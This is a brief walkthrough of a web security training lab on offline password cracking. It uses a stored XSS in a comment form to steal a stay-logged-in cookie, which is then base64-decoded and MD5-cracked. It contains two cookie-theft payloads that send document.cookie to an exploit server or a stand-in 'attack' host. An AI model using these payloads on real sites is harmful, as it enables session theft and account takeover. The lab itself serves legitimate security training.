\# Lab: Offline password cracking



\### PRACTITIONER





\## THEORY



In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed.





\## METHOD

first, the lab tells us about an xss vulnerability in the comment functionality.



This gave a clear hint of how we had to get carlos' stay-logged-in cookie, by leveraging xss to capture carlos' cookie unto our provided exploit server.





submit the comment

```

<img src=x onerror="window.location.href='https://exploit-LAB\_ID.exploit-server.net/log'+document.cookie;">



OR USE ANY XSS PAYLOAD 4 COOKIE THEFT YOU WANT, EVEN



<script>fetch('http://attack/'+document.cookie);</script>



ALL THAT MATTERS IS OBTAINING THE COOKIE

```

fill the others as pleased.



Now, wait for carlos' cookies to be captured in the logs.



Once captured, base64 decode it and crack the md5 hash, log in and complete what the lab asked.





